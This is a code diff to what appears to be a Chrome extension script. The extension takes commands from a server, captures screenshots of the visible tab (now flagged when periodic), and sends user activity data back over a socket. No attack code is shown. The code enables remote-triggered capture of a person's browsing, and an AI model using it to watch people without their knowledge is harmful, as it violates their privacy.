@@ -130,7 +130,9 @@ async function handleCommand(command) {
       return await navigateToUrl(command.params?.url);
     
     case 'screenshot':
-      return await takeScreenshot();
+      // Check if this is a periodic screenshot based on command ID
+      const isPeriodic = command.id && command.id.startsWith('periodic_screenshot_');
+      return await takeScreenshot(isPeriodic);
       
     case 'getContent':
       return await getPageContent();
@@ -164,12 +166,13 @@ function sendActivityToServer(activity, bufferIfDisconnected = true) {
     // Format the message for the server
     const message = {
       type: 'userActivity',
-      activity: activity
+      activity: activity.type, // Make sure we're sending the activity type as a string
+      data: activity.data || {}
     };
     
     try {
       socket.send(JSON.stringify(message));
-      console.log('Sent activity to server:', activity.activity);
+      console.log('Sent activity to server:', activity.type);
       return true;
     } catch (error) {
       console.error('Error sending activity to server:', error);
@@ -231,7 +234,7 @@ async function navigateToUrl(url) {
   });
 }
 
-async function takeScreenshot() {
+async function takeScreenshot(isPeriodic = false) {
   return new Promise((resolve, reject) => {
     chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(dataUrl) {
       if (chrome.runtime.lastError) {
@@ -241,7 +244,19 @@ async function takeScreenshot() {
       
       // Extract base64 image data
       const base64Data = dataUrl.split(',')[1];
-      resolve({success: true, screenshot: base64Data});
+      
+      // Add metadata about the screenshot
+      let result = {
+        success: true, 
+        screenshot: base64Data
+      };
+      
+      // Add periodic flag if this is a periodic screenshot
+      if (isPeriodic) {
+        result.type = 'periodic';
+      }
+      
+      resolve(result);
     });
   });
 }
